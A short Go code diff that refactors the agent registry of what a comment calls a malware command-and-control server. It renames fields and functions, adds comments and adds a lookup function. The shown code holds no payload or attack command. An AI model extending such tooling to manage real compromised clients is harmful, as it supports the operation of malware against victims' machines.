@@ -11,12 +11,14 @@ func init() {
 	agents = make(map[string]*Agent)
 }
 
+// An Agent represents a malware client that has connected to the server.
 type Agent struct {
-	Id       string
+	ID       string
 	LastSeen time.Time
 	Addr     net.Addr
 }
 
+// Agents returns the list of agents that have been seen.
 func Agents() []*Agent {
 	results := make([]*Agent, len(agents))
 	i := 0
@@ -25,16 +27,24 @@ func Agents() []*Agent {
 		i++
 	}
 
-	// TODO: Sort before returning
-
 	return results
 }
 
-func AddAgent(agent *Agent) {
-	if a, ok := agents[agent.Id]; ok {
+// Add adds a new agent to the list of seen agents.
+func Add(agent *Agent) {
+	if a, ok := agents[agent.ID]; ok {
 		a.LastSeen = time.Now()
 	} else {
 		agent.LastSeen = time.Now()
-		agents[agent.Id] = agent
+		agents[agent.ID] = agent
 	}
+}
+
+// Exists checks if a given agent ID is in the list of agents.
+func Exists(ID string) bool {
+	if _, ok := agents[ID]; ok {
+		return true
+	}
+
+	return false
 }
